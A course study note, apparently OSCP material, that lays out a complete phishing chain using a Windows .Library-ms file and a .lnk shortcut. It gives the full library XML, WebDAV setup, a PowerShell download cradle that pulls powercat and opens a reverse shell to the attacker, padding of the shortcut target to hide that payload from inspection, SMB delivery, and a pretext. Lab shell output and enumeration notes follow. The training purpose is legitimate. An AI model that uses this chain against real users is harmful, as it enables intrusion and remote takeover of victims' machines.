**What a library file actually is:** a virtual container (`.Library-ms`) that connects Windows Explorer to content sitting somewhere else entirely, a web service, a network share, anything reachable. Double-click one and Explorer renders that remote content as if it were an ordinary local folder. Legitimate use case: the built-in "Documents"/"Pictures" libraries in Explorer are exactly this mechanism, just pointed at local folders instead of something remote.

**The two-stage attack this enables:**
1. **Stage 1, the library file itself.** Delivered to the victim (email attachment is the classic vector). Double-clicking it makes a WebDAV share on the attacker's box appear as a normal-looking local directory in Explorer.
2. **Stage 2, a `.lnk` shortcut sitting inside that WebDAV directory.** The victim still has to double-click *this* to actually trigger anything, it launches a PowerShell reverse shell via a download cradle.

**Why not just email a link to a hosted `.lnk` file directly, skipping the library-file step entirely?** Because spam filters and mail security products actively inspect link destinations and flag executable file types before the email ever reaches the inbox. A `.Library-ms` attachment, by contrast, gets passed straight through by most of these same filters, it isn't recognized as a suspicious file type the way a direct link to an `.exe`/`.lnk` download would be. Once it lands and gets opened, Explorer just quietly renders the WebDAV content as a trusted-looking local folder, no further filtering happens at that point.

#### Step 1: Set up a WebDAV share on Kali with WsgiDAV

```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
*`--host=0.0.0.0` listens on all interfaces, `--port=80` (WebDAV over plain HTTP is what the library file will expect), `--auth=anonymous` disables auth entirely (the victim's Explorer session won't be prompted for credentials), `--root` points it at the share directory. `test.txt` is just a placeholder to confirm the share is serving content before building anything else.*

**Confirm it's live:** browse to `http://127.0.0.1` (or the WebDAV host's IP from another box) and check `test.txt` is listed.

#### Step 2: Build the Windows library file's XML

Library files are hand-editable XML (Notepad works, VS Code is nicer for syntax highlighting) with three logical sections: general library info, library properties, and library locations. Built via RDP into the prep machine (VM #1 of whichever VM group), using VS Code on the desktop.

**General info: namespace and identity.**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```
*Namespace is fixed for the Windows 7+ library file format, don't change it. Everything else goes inside `<libraryDescription>`.*

```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```
*`name` isn't an arbitrary string, it's a DLL+string-resource-index reference, per the [Library Schema `name` element docs](https://learn.microsoft.com/en-us/windows/win32/shell/schema-library-name). `@shell32.dll,-34575` is the other commonly-cited option, `@windows.storage.dll,-34582` was chosen here specifically to dodge naive text filters that pattern-match on the literal string "shell32". `version` is just an arbitrary numeral.*

```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```
*Pinning it to Explorer's navigation pane and giving it a real Windows icon are both purely cosmetic legitimacy details, small things that make a target less likely to hesitate. `imageres.dll,-1002` is the Documents icon, `-1003` is Pictures, used here since Pictures reads as more benign/less "this touches my files" than Documents.*

```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```
*Controls which columns/details view Explorer defaults to when the library opens, this GUID is the Documents folder type. Full list of known-folder GUIDs (for picking a different one) is in Microsoft's [`KNOWNFOLDERID` reference](https://learn.microsoft.com/en-us/windows/win32/shell/knownfolderid).*

**Library locations, the actual payload of the whole file, points at the WebDAV share:**
```xml
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<kali_ip></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```
*`url` is the one tag that actually matters functionally, everything else in the file is dressing. `isSupported` is undocumented but needed for compatibility, set `false`. Full annotated schema reference: [Library Description Schema, Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry).*

**Full assembled file** (save as `config.Library-ms` on the desktop, via VS Code's File → New Text File → paste → Save As):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<kali_ip></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

#### Step 3: Test it, and handle the WebDAV self-rewrite gotcha

Double-click `config.Library-ms` on the desktop. Expected: Explorer opens it like a normal folder and `test.txt` shows up, confirming the WebDAV connection works. Bonus: the Explorer address bar just shows `config`, no visible indication it's actually a remote location, good cover.

> **⚠️ Gotcha: opening the file mutates it.** Reopen `config.Library-ms` in VS Code afterward and two things changed: a new `serialized` tag appeared (base64-encoded location info), and the `url` tag's content flipped from `http://<kali_ip>` to a UNC-style path (`\\<kali_ip>\DavWWWRoot`). Windows silently "optimizes" the file for its own native WebDAV client the first time it's opened. The library file still works in this mutated state on the machine that mutated it, but the serialized/UNC version may **not** work correctly on a different machine or after a restart, risking an empty-looking WebDAV share for the actual victim.
> **Fix:** before sending the file anywhere, reset it back to the original plain XML (re-paste the full listing from Step 2 over whatever's currently in the file). This has to be redone every time the file gets test-opened, but since a real assessment only needs the victim to open it once, it's a minor annoyance rather than a blocker.

#### Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)

Right-click the desktop → **New → Shortcut**. In the "type the location" field, point it at PowerShell with a download-cradle argument, same PowerCat pattern as [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]'s macro payload, just delivered via a shortcut's target instead of VBA:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');powercat -c <kali_ip> -p 4444 -e powershell"
```
Name it something benign-sounding when prompted, e.g. `automatic_configuration`, matching whatever the pretext promises.

> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate this exact PowerShell-shortcut-target style payload directly if you'd rather not hand-type it.
> 🔗 **HackTricks** LNK payload techniques: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/phishing-methodology/phishing-documents.md), the "Backdoored Documents & Files" page has two dedicated sections on more advanced `.lnk` chains (ZIP-embedded fileless payloads, decoy-first staging with scheduled-task persistence) beyond the single-stage PowerCat cradle used here. *(Linking to the GitHub source since the hosted book site is paywalled, same workaround used for HackTricks links throughout [[SQL Injection Attacks]] and elsewhere in this vault.)*

**Evasion trick for a tech-savvy target who checks the shortcut's Properties first:** Windows only displays the first ~255 characters of a shortcut's target field in the Properties window, but the actual target can hold up to 4096. Padding the malicious command with a delimiter followed by a long, boring, benign-looking command pushes the real payload past what's visible in Properties, anyone eyeballing it before running sees only the harmless-looking prefix/suffix.

**Where to host `powercat.ps1`, and why not just drop it on the WebDAV share itself:** the WebDAV share needs to stay writable (useful for pulling files off a compromised target later), and a writable share is exactly the kind of place AV/EDR might quarantine a payload sitting in plain sight. A plain `python3 -m http.server 8000` serving it separately avoids that risk entirely, same tool used throughout [[Common Web Application Attacks]] and [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]].

#### Step 5: Local test (CLIENT137, VM #1)

```bash
python3 -m http.server 8000    # serving powercat.ps1
nc -nvlp 4444
```
Double-click the shortcut on the desktop, confirm the "run this application" prompt, accept it. Expected: listener catches a PowerShell prompt, confirming the full chain (library file → WebDAV → shortcut → PowerCat) works end to end before ever touching the real target.

#### Step 6: Full delivery to a target (HR137, via a simulated email/SMB drop)

**The pretext matters as much as the payload**, matching everything already covered in [[Phishing Basics]]. Example pretext used here: posing as a new IT team member rolling out a "new management platform," asking the target to open the attachment and double-click a "configuration" shortcut inside it.

**Staging on Kali before delivery:**
```bash
cd ~/webdav
rm test.txt                              # remove the placeholder
# copy automatic_configuration.lnk and config.Library-ms into ~/webdav too
python3 -m http.server 8000              # powercat.ps1
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
nc -nvlp 4444
```

**Delivery, simulated here via an SMB share (a real assessment would more likely use email). Only the library file goes to the target, the `.lnk` stays on the WebDAV share for it to reach:**
```bash
smbclient //<target_ip>/share -c 'put config.Library-ms'
```
*`-c` runs a single command non-interactively rather than dropping into an interactive `smb: \>` prompt, same idea as [[Common Web Application Attacks]]'s `smbclient` usage but scripted for a one-shot upload.*

Once the simulated user opens the delivered library file and then the shortcut inside it, the listener catches a shell in the target's own context (e.g. `hr137\hsmith`).

🔁 **Similar to:** the overall two-stage "get something trusted-looking in front of the user, deliver the actual payload from infrastructure you control" shape mirrors [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]'s macro delivery and [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]]'s RFI-hosted-webshell pattern. The core lesson repeats across all of them: the delivery mechanism and the actual execution payload don't have to be the same file, splitting them is often what gets past filtering in the first place.

> 🔗 **Further reading:** [v4resk/red-book: Windows Library Files](https://github.com/v4resk/red-book/blob/main/redteam/weapon/code-execution/windows-library-files.md), a red-team reference covering this exact technique end to end, useful for variations beyond what's covered here.

**Worth knowing: this file type has a real, patched CVE pair beyond what the module covers.** [CVE-2025-24054 / CVE-2025-24071](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC) cover a related but distinct bug: a `.library-ms` file containing a UNC path, when merely **opened or previewed** in Explorer (no `.lnk` double-click needed at all), triggers an outbound SMB authentication attempt to whatever server the UNC path names. Point that at a Responder listener instead of a WebDAV share and it leaks the victim's NTLMv2 hash directly, no second-stage shortcut required. Same file family, different goal (credential capture over authentication-forcing rather than a reverse shell), worth remembering as a lighter-weight variant if a full two-stage chain isn't necessary.

**On GTFOBins and PayloadsAllTheThings for this section:** deliberately not cited here. GTFOBins is Linux SUID/sudo/capability-specific, doesn't apply to a Windows client-side delivery chain. PayloadsAllTheThings was checked directly (no guessed links) and doesn't currently have a dedicated page for `.library-ms`/WebDAV-lure phishing, its shortcut/LNK coverage lives mostly in the Windows privesc and reverse-shell-cheatsheet pages already linked elsewhere in this vault, not this specific delivery technique.

> ⚡ **Modern tool:** [[Ntlm_theft]] generates the same `.library-ms` lure built tag-by-tag above, plus half a dozen other NTLM-capturing file formats, in one command. Worth building the XML by hand once first (this section, and [[Client-Side Attacks (Breakdowns)|the tag-by-tag breakdown]]) to actually understand what each tag does.

#### Tags: #WindowsLibraryFiles #LibraryMs #WebDAV #WsgiDAV #LNKShortcut #PowerCat #ReverseShell #MOTW #TwoStageAttack #ClientSideAttack #CVE202524054

> 📋 Generalized copy-pasteable commands: [[Reconnaissance & Enumeration#Exiftool (Document Metadata Analysis)|Command Appendix]] *(to be extended once labs are complete)*
> 🧭 Quick lookup: [[Reconnaissance & Enumeration (Decision Tree)|Decision Tree]]

---

## 🎯 Related Boxes to Practice

Checked properly this time (verified via direct research rather than guessing, same standard as every other "Related Boxes" section in this vault): **no confident HTB match for this specific technique.** Standard HTB machines run unattended, there's no simulated user to double-click a phished library file or shortcut, so the "get a target to open something" half of this vector genuinely can't be replicated on a normal box the way [[Common Web Application Attacks]]'s web vulnerabilities could. That's exactly why Offsec built dedicated simulated-user labs (HR137/TICKETS, ADMIN) for this module instead.

Closest real-world adjacent technique worth knowing: [CVE-2025-24054/24071](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC)'s NTLM-leak-via-`.library-ms` (noted above), which doesn't need double-click execution at all, just Explorer previewing a UNC-path-containing file dropped on a share. That mechanism (an authentication-coercion file dropped somewhere Explorer will touch it) does show up on real HTB/AD boxes, just usually via `.scf`/`.url`-style files rather than `.library-ms` specifically, worth keeping an eye out for during SMB share enumeration on future boxes.

#### Tags: #RelatedBoxes #HTBPractice #NoDirectMatch

---

## Labs (12.3)

> 🚩 **Hands-on, VM spin-up required.** Pausing the write-up here, these three need actual VMs running before walking through them. Two VM groups are involved:
> - **VM Group 1** (build machine CLIENT137 = VM #1, target HR137 = VM #2)
> - **VM Group 2** (build machine = VM #3, capstone target ADMIN = VM #4)

### Lab 1: Get code execution on HR137 (VM Group 1, VM #2) via library + shortcut files
Build on VM #1 (CLIENT137), deliver to VM #2 (HR137). Flag is on the `hsmith` desktop.
**Note from the module text:** the delivered library file gets removed from the target's SMB share automatically every time a `.lnk` execution happens from the WebDAV share, worth remembering if a retry is needed.

**This session's run (VM Group 1, IPs `192.168.243.194`/`.195`):**

**Step 1 (local test, CLIENT137):**
```
whoami
```
```
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
client137\offsec
```
*Confirmed the full local chain (library file → WebDAV → `.lnk` → PowerCat) works before ever touching HR137.*

**Step 2 (real delivery, HR137):**
```
whoami
cd C:\Users\hsmith\Desktop
dir
type flag.txt
```
```
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
hr137\hsmith
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\hsmith\Desktop
PS C:\Users\hsmith\Desktop> dir

    Directory: C:\Users\hsmith\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/6/2026   7:08 PM             38 flag.txt
-a----          5/5/2022   2:25 PM           2350 Microsoft Edge.lnk

PS C:\Users\hsmith\Desktop> type flag.txt
OS{7eef898c46f3ad8917f271d3ff48e0ef}
```
*Worked first try, both the SMB share name (`share`) and the whole delivery chain matched the module's own example exactly, no VM-corruption or one-shot-watcher problems this time.*

**Lab answer:** **`OS{7eef898c46f3ad8917f271d3ff48e0ef}`**, `hr137\hsmith`. ✅ Done.

### Lab 2: True/false, is the `.lnk` file MOTW-tagged when executed by double-clicking the library file in Explorer?
This is an experiential question (needs the actual behavior observed on-target), not answerable from the module's own prose alone.

**Checked empirically on CLIENT137**, since it walked the identical library-file → WebDAV → `.lnk` path HR137 did:
```powershell
Get-Item -Path .\automatic_configuration.lnk -Stream Zone.Identifier
```
Returned a real `Zone.Identifier` stream: `[ZoneTransfer]\nZoneId=3`.

**`ZoneId=3` is specifically the Internet zone.** Even though the library file makes the WebDAV share *look* like an ordinary local folder in Explorer (per [[Client-Side Attacks#Step 3: Test it, and handle the WebDAV self-rewrite gotcha|12.3.1, Step 3]]'s "path in the navigation bar only shows `config`" observation), Windows still correctly tracks that the content actually came in over a network connection, and tags it exactly as it would a browser download. The visual "looks local" trick doesn't fool the underlying zone-tracking mechanism, only the human looking at Explorer's address bar.

**Lab answer:** **True.**

### Lab 3 (Capstone): Enumerate ADMIN (VM Group 2, VM #4), get code execution via library + shortcut files
No hand-holding this time, enumerate first, then apply the technique. Build the attack on VM #3, flag is on the `Administrator` desktop.

**🔴 Blocked, unresolved after a genuinely thorough enumeration pass.** Target: ADMIN (VM #4, `192.168.243.199`), build machine VM #3 (`192.168.243.194`, `offsec`/`lab`, same role as CLIENT137). Confirmed identically across **two independent fresh VM reverts**, so none of this is instance corruption, it's the box's actual configuration.

**Port scan (`nmap -sSCV --script vuln -p- --min-rate 5000`):**
```
25/tcp    smtp     hMailServer smtpd
80/tcp    http     Microsoft IIS httpd 10.0
110/tcp   pop3     hMailServer pop3d
135/tcp   msrpc
139/tcp   netbios-ssn
143/tcp   imap     hMailServer imapd
445/tcp   microsoft-ds
587/tcp   smtp     hMailServer smtpd (submission)
5985/tcp  http     WinRM (HTTP)
5986/tcp  ssl/wsmans  WinRM (HTTPS, valid Cloudbase-Init cert)
47001/tcp http     WinRM
49664-49670/tcp  msrpc (ephemeral RPC)
```
*hMailServer confirmed as the mail backend. Not domain-joined (`systeminfo` → `WORKGROUP`), so local-account email format is `user@ADMIN`, confirmed via a POP3 error message ("Please use full email address as user name").*

**Every avenue tried, all ruled out:**
- **SMB**: anonymous (`-N`) → `NT_STATUS_ACCESS_DENIED` at session setup (before even reaching share-name resolution, unlike HR137 where anonymous worked cleanly). `offsec`/`lab` explicitly → `NT_STATUS_LOGON_FAILURE`. Guessing share names is pointless here since the block happens at authentication, not share lookup.
- **RPC null session** (`rpcclient -U "" -N`): `NT_STATUS_ACCESS_DENIED`.
- **WinRM**, both transports, both username formats: `evil-winrm -u offsec -p lab` and `-u offsec@ADMIN -p lab`, over both HTTP (5985) and HTTPS/`-S` (5986), all four combinations gave the identical `WinRM::WinRMAuthorizationError` (auth accepted, authorization for remote shell access denied).
- **SMTP** (`swaks`): unauthenticated always `530 SMTP authentication is required` at `RCPT TO`, tried with both an external-looking sender (`test@test.com`) and a local-format sender (`test@ADMIN`), identical result both times. Authenticated with `offsec`/`lab` (both bare and `@ADMIN` formats): `535 Authentication failed`.
- **POP3** (`curl pop3://`): `offsec`/`lab` invalid in both username formats, second attempt returned **"Too many invalid logon attempts"**, a lockout warning, stopped guessing here deliberately rather than risk extending it.
- **IIS web root**: stock default page only. `feroxbuster` with `dirb/common.txt` then again with SecLists' `raft-medium-directories.txt` (180k requests), zero custom content found either pass. Tried 3 `Host:` header guesses (`admin.local`, `ADMIN`, `www.admin.local`) for a vhost, all three returned the identical default page.
- **VM #3 local sweep**: `cmdkey /list` → empty. PowerShell history → only our own commands from this session. Broad `C:\` file search (narrowed after an initial too-broad pass caught thousands of framework files) → nothing beyond the standard desktop shortcuts and a Cloudbase-Init provisioning transcript (not a hint, just VM setup noise). Confirmed `WORKGROUP` (not domain-joined). Only non-default service account: `cloudbase-init` itself. Only non-Microsoft scheduled tasks: default OneDrive tasks. `Get-StartApps` showed a stock **Mail** app (built into every Windows 11 install) but opening it prompts to add an account from scratch, not pre-configured. No third-party mail client installed (checked the full uninstall-registry program list).

**🛠️ Genuine mistake made mid-session, worth flagging:** spent a long stretch trying `offsec`/`lab` (VM #3's own RDP creds) against ADMIN via WinRM/SMB/mail, despite the lab panel explicitly stating **"No credentials were provided for this machine"** for VM #4, the exact same wording HR137 had, where the answer was never "find creds," it was "deliver anonymously and let it run itself." Confirmed via OffSec's own exam guide that WinRM/`evil-winrm` itself is completely fine to use (it's credentialed access, not automated exploitation, see [OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)), the mistake was targeting the wrong machine with them, not the tool choice itself.

**🤖 Two OffSec KAI consultations tried, neither produced a usable answer:**
- **First response**: a full theory recap matching this module's own 12.3.1 content almost verbatim (build the library file + `.lnk` on VM #3, host on WebDAV, catch a shell), but the actual delivery mechanism was hand-waved as "use social engineering or a pretext to convince the victim user," never specifying *how* the file physically reaches ADMIN. No new information over what's already documented above.
- **Second response**, after being given the specific blocker (SMB denied at session setup, all creds failing everywhere, SMTP requiring auth): told to "physically or interactively access ADMIN... via RDP, console access, or any interactive session you have," then described what to do *once already logged in* (open a browser, use PowerShell, clipboard/USB transfer). **This is circular and self-contradicting**: it assumes the exact access we don't have (the lab explicitly states no credentials were provided for VM #4) as the premise for explaining how to get access. Confirms KAI was pattern-matching generic client-side-attack theory rather than grounded knowledge of this specific lab's intended solution, worth treating any AI-generated answer (KAI, this assistant, anything) with the same skepticism when it doesn't survive a basic logical check.

*(Confirmed with OffSec's own exam guide first: KAI/AI-assistant usage is fine here, the AI-prohibition is specifically an exam-day rule, not a coursework/lab rule.)*

**Where this stands:** genuinely blocked after ruling out every standard avenue, twice, on independent instances, plus two AI consultations that didn't hold up under scrutiny. Recommend checking Offsec's official support/discussion forum for this specific capstone, a person who's actually seen this exact lab is worth more at this point than further enumeration or AI round-trips. Pausing here for this session.

**Lab answer:** ⬜ Pending, blocked, see enumeration trail above.

#### Tags: #Lab #Quiz #Module12 #Pending #NeedsVM

---

## 12.4. Wrapping Up

Client-side attacks earn their keep specifically against internal, non-routable networks, exactly the environment where a straight port-scan-and-exploit approach ([[Common Web Application Attacks]]'s whole territory) has nothing to reach. Instead of attacking exposed services, this whole module attacked *trust*: trust in a familiar Office macro prompt ([[Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]]), trust in what looks like a local folder ([[Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]]), and underneath both of those, trust built through reconnaissance and pretext ([[Client-Side Attacks#12.1. Target Reconnaissance|12.1]], and everything from [[Phishing Basics]] before it). Worth carrying forward: on an internal engagement, this is very often the only way in at all.

#### Tags: #Module12Summary #ClientSideAttacksRecap
